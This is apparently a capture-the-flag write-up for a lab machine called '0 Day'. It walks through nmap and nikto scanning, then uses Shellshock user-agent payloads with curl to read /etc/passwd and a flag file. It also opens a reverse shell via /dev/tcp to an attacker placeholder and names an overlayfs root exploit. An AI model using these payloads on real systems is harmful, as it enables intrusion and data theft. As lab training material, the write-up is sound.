
# ***0 Day***

We'll start with nmap scan:

```bash
$ sudo nmap 10.10.235.230 -Pn -p- -A -vv -T4 --script discovery,vuln -oN nmap-scan --min-parallelism 55
```

And once an http port pops out, we'll start nikto scan in parallel:

```bash
$ nikto -h 10.10.235.230
```

Pay attention to nikto's result:

```
+ Uncommon header '93e4r0-cve-2014-6278' found, with contents: true
+ OSVDB-112004: /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).
```

The exploit for CVE-2014-6271 can be found on [GitHub](https://github.com/opsxcq/exploit-CVE-2014-6271).

To check if it's vulnerable, send this request:

```bash
$ curl http://10.10.235.230/cgi-bin/test.cgi -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'"
```

And we got /etc/passwd file in responce!

Read user flag:

```bash
$ curl http://10.10.235.230/cgi-bin/test.cgi -H "user-agent: () { :; }; echo; echo; /bin/sh -c 'cat /home/ryan/user.txt'"
```

Get initial foothold with this payload:

```
$ curl http://10.10.235.230/cgi-bin/test.cgi -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1'"
```

---

## *Privesc*

Launch linpeas.sh. You'll see that the machine is vulnerable to overlayfs 
(CVE-2015-1328).

Export this path:

```bash
$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

compile exploit and gaiin root.
